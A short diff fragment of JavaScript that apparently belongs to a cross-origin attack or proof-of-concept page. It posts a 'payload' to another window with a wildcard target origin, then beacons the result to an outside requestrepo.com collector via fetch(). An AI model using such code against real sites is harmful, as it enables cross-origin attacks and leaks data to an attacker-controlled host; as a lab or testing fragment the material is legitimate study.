@@ -17,7 +17,7 @@
         if (win) {
             console.log("Sending payload...");
             win.postMessage(payload, "*");
-            fetch(`https://we6hfxdk.requestrepo.com?status=` + encodeURIComponent(win));
+            fetch('http://we6hfxdk.requestrepo.com/?status=' + encodeURIComponent(win));
         }
     }, 2000);
       
